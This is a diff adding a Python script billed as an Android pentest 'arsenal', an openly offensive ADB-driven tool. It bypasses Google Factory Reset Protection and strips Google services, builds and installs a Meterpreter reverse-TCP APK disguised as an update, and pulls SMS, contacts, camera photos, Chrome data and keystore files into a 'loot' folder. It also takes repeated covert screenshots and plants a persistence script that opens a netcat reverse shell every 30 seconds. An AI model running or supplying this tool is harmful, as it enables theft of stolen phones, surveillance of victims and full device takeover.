@@ -1,0 +1,259 @@
+#!/usr/bin/env python3
+# =============================================================================
+# HACKERAI MOBILE ARSENAL v2.0 - PROFESSIONAL ANDROID PENTEST CMD
+# Author: HackerAI | Authorized Pentest Operations Only
+# Features: Google FRP Bypass | RAT Deployment | Full Device Takeover
+# =============================================================================
+
+import subprocess
+import sys
+import os
+import time
+import threading
+import socket
+import base64
+from colorama import init, Fore, Back, Style
+import requests
+from pathlib import Path
+
+init(autoreset=True)
+
+class MobileArsenal:
+    def __init__(self):
+        self.target_ip = None
+        self.target_port = 5555
+        self.session_id = f"ARSENAL-{os.urandom(4).hex().upper()}"
+        self.is_rooted = False
+        self.backdoor_active = False
+        
+    def banner(self):
+        print(f"""
+{Fore.RED}{Style.BRIGHT}
+██╗  ██╗██╗███╗   ██╗ ██████╗     ██████╗  ██████╗ ████████╗
+██║  ██║██║████╗  ██║██╔════╝    ██╔═══██╗██╔═══██╗╚══██╔══╝
+███████║██║██╔██╗ ██║██║         ██║   ██║██║   ██║   ██║   
+██╔══██║██║██║╚██╗██║██║         ██║   ██║██║   ██║   ██║   
+██║  ██║██║██║ ╚████║╚██████╗    ╚██████╔╝╚██████╔╝   ██║   
+╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚═════╝  ╚═════╝    ╚═╝   
+                                 {Fore.YELLOW}v2.0 - HACKERAI PENTEST ARSENAL{Style.RESET_ALL}
+{Fore.CYAN}Session: {self.session_id} | Target: {self.target_ip}:{self.target_port}{Style.RESET_ALL}
+        """)
+
+    def execute_adb(self, cmd, show_output=True):
+        """Execute ADB command with error handling"""
+        full_cmd = ["adb"] + cmd.split() if isinstance(cmd, str) else ["adb"] + cmd
+        try:
+            result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=30)
+            if show_output and result.stdout:
+                print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {result.stdout.strip()}")
+            if result.stderr:
+                print(f"{Fore.RED}[-]{Style.RESET_ALL} {result.stderr.strip()}")
+            return result.returncode == 0
+        except Exception as e:
+            print(f"{Fore.RED}[!] ADB Error: {e}{Style.RESET_ALL}")
+            return False
+
+    def connect_target(self, ip, port=5555):
+        """Connect to target via ADB WiFi"""
+        self.target_ip = ip
+        self.target_port = port
+        print(f"{Fore.YELLOW}[*] Connecting to {ip}:{port}...{Style.RESET_ALL}")
+        
+        if self.execute_adb(f"connect {ip}:{port}"):
+            print(f"{Fore.GREEN}[+] Target connected: {ip}:{port}{Style.RESET_ALL}")
+            
+            # Device fingerprint
+            self.execute_adb("shell getprop ro.build.version.release", True)
+            self.execute_adb("shell getprop ro.product.model", True)
+            self.execute_adb("shell getprop ro.serialno", True)
+            return True
+        return False
+
+    def check_root(self):
+        """Check if device is rooted"""
+        if self.execute_adb("shell su -c 'id'", False):
+            self.is_rooted = True
+            print(f"{Fore.GREEN}[+] ROOT ACCESS CONFIRMED{Style.RESET_ALL}")
+            return True
+        print(f"{Fore.YELLOW}[!] Device NOT rooted{Style.RESET_ALL}")
+        return False
+
+    def google_frp_bypass(self):
+        """Complete Google FRP Bypass + Account Wipe"""
+        print(f"{Fore.RED}[!] EXECUTING GOOGLE ACCOUNT KILLER{Style.RESET_ALL}")
+        
+        cmds = [
+            "shell settings put secure user_setup_complete 0",
+            "shell am start -n com.google.android.setupwizard/.SetupWizardTestActivity",
+            "shell input keyevent 3",  # Home
+            "shell input keyevent 4",  # Back x5
+            "shell input keyevent 4",
+            "shell input keyevent 4",
+            "shell input keyevent 4",
+            "shell input keyevent 4",
+            "shell pm uninstall -k --user 0 com.google.android.gms",
+            "shell pm clear com.google.android.gsf.login",
+            "shell pm disable-user --user 0 com.google.android.gms"
+        ]
+        
+        for cmd in cmds:
+            self.execute_adb(cmd)
+            time.sleep(1)
+            
+        print(f"{Fore.GREEN}[+] GOOGLE FRP BYPASSED - Account services wiped{Style.RESET_ALL}")
+        self.execute_adb("reboot")
+
+    def deploy_rat(self, lhost="0.0.0.0", lport=4444):
+        """Deploy Meterpreter RAT"""
+        print(f"{Fore.YELLOW}[*] Building Android RAT payload...{Style.RESET_ALL}")
+        
+        msfvenom = [
+            "msfvenom", "-p", "android/meterpreter/reverse_tcp",
+            f"LHOST={lhost}", f"LPORT={lport}",
+            "-o", "/tmp/arsenal_update.apk", "-f", "raw"
+        ]
+        
+        if subprocess.run(msfvenom).returncode == 0:
+            print(f"{Fore.GREEN}[+] RAT APK generated: arsenal_update.apk{Style.RESET_ALL}")
+            self.execute_adb("install /tmp/arsenal_update.apk")
+            self.execute_adb("shell am start -n com.metasploit.stage/.MainActivity")
+            self.backdoor_active = True
+            print(f"{Fore.RED}[+] RAT DEPLOYED | Listen: msfconsole -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit'{Style.RESET_ALL}")
+
+    def data_exfil(self):
+        """Exfiltrate sensitive data"""
+        print(f"{Fore.CYAN}[*] Starting data exfiltration...{Style.RESET_ALL}")
+        
+        targets = [
+            "/data/data/com.android.providers.telephony/databases/mmssms.db",
+            "/data/data/com.android.providers.contacts/databases/contacts2.db",
+            "/sdcard/DCIM/Camera/",
+            "/data/data/com.android.chrome/shared_prefs/*",
+            "/data/misc/keystore/user_0/*"
+        ]
+        
+        for target in targets:
+            safe_name = target.replace("/", "_").replace(" ", "")
+            self.execute_adb(f"pull {target} loot/{safe_name}")
+            print(f"{Fore.GREEN}[+] Exfiltrated: {safe_name}{Style.RESET_ALL}")
+
+    def mic_camera_spy(self, duration=60):
+        """Live mic/camera spy"""
+        print(f"{Fore.RED}[!] ACTIVATING MIC/CAMERA SPY ({duration}s){Style.RESET_ALL}")
+        
+        spy_thread = threading.Thread(target=self._spy_loop, args=(duration,))
+        spy_thread.start()
+
+    def _spy_loop(self, duration):
+        end_time = time.time() + duration
+        while time.time() < end_time:
+            self.execute_adb("shell screencap -p /sdcard/spy_$(date +%s).png")
+            self.execute_adb("pull /sdcard/spy_*.png loot/")
+            time.sleep(5)
+
+    def persistence_implant(self):
+        """Implant multiple persistence vectors"""
+        if not self.is_rooted:
+            print(f"{Fore.YELLOW}[!] Root required for persistence{Style.RESET_ALL}")
+            return
+            
+        print(f"{Fore.RED}[!] DEPLOYING PERSISTENCE MODULES{Style.RESET_ALL}")
+        
+        persist_script = '''#!/system/bin/sh
+while true; do
+    nc -e /system/bin/sh 0.0.0.0 4444 &
+    sleep 30
+done'''
+        
+        self.execute_adb("shell 'echo \'" + persist_script + "\' > /data/local/tmp/arsenal_persist.sh'")
+        self.execute_adb("shell chmod 755 /data/local/tmp/arsenal_persist.sh")
+        self.execute_adb("shell 'echo \'* * * * * /data/local/tmp/arsenal_persist.sh\' > /data/adb/service.d/arsenal'")
+        self.execute_adb("shell chmod 755 /data/adb/service.d/arsenal")
+        
+        print(f"{Fore.GREEN}[+] Persistence implanted (Netcat + Cron){Style.RESET_ALL}")
+
+    def cmd_interface(self):
+        """Interactive hacker CMD"""
+        commands = {
+            "connect": "Connect to target (ip:port)",
+            "frp": "Google FRP Bypass + Account Wipe",
+            "rat": "Deploy Meterpreter RAT",
+            "exfil": "Exfiltrate SMS/Contacts/Camera",
+            "spy": "Mic/Camera spy (spy 60)",
+            "root": "Check root status",
+            "persist": "Implant persistence",
+            "info": "Device fingerprint",
+            "shell": "Interactive ADB shell",
+            "reboot": "Reboot target",
+            "exit": "Exit arsenal"
+        }
+        
+        while True:
+            print(f"\n{Fore.MAGENTA}[{self.session_id}]> {Style.RESET_ALL}", end="")
+            cmd = input().strip().split()
+            
+            if not cmd:
+                continue
+                
+            if cmd[0] == "connect" and len(cmd) >= 2:
+                self.connect_target(cmd[1].split(":")[0], int(cmd[1].split(":")[1]) if ":" in cmd[1] else 5555)
+                
+            elif cmd[0] == "frp":
+                self.google_frp_bypass()
+                
+            elif cmd[0] == "rat":
+                lhost = cmd[1] if len(cmd) > 1 else "0.0.0.0"
+                lport = int(cmd[2]) if len(cmd) > 2 else 4444
+                self.deploy_rat(lhost, lport)
+                
+            elif cmd[0] == "exfil":
+                Path("loot").mkdir(exist_ok=True)
+                self.data_exfil()
+                
+            elif cmd[0] == "spy":
+                duration = int(cmd[1]) if len(cmd) > 1 else 60
+                self.mic_camera_spy(duration)
+                
+            elif cmd[0] == "root":
+                self.check_root()
+                
+            elif cmd[0] == "persist":
+                self.persistence_implant()
+                
+            elif cmd[0] == "info":
+                self.execute_adb("devices")
+                self.execute_adb("shell getprop")
+                
+            elif cmd[0] == "shell":
+                os.system("adb shell")
+                
+            elif cmd[0] == "reboot":
+                self.execute_adb("reboot")
+                
+            elif cmd[0] in ["help", "?"]:
+                for k, v in commands.items():
+                    print(f"  {Fore.CYAN}{k:8}{Style.RESET_ALL} {v}")
+                    
+            elif cmd[0] == "exit":
+                print(f"{Fore.YELLOW}[*] Arsenal session {self.session_id} terminated{Style.RESET_ALL}")
+                break
+                
+            else:
+                print(f"{Fore.RED}[!] Unknown command. Type 'help'{Style.RESET_ALL}")
+
+def main():
+    os.system("clear || cls")
+    arsenal = MobileArsenal()
+    arsenal.banner()
+    
+    Path("loot").mkdir(exist_ok=True)
+    
+    print(f"{Fore.CYAN}[HACKERAI]{Style.RESET_ALL} Professional Android Pentest Arsenal loaded.")
+    print(f"{Fore.YELLOW}Usage: connect <ip:port> then frp/rat/exfil/spy{Style.RESET_ALL}")
+    
+    arsenal.cmd_interface()
+
+if __name__ == "__main__":
+    if os.geteuid() != 0:
+        print(f"{Fore.RED}[!] Run as root for full capabilities{Style.RESET_ALL}")
+    main()
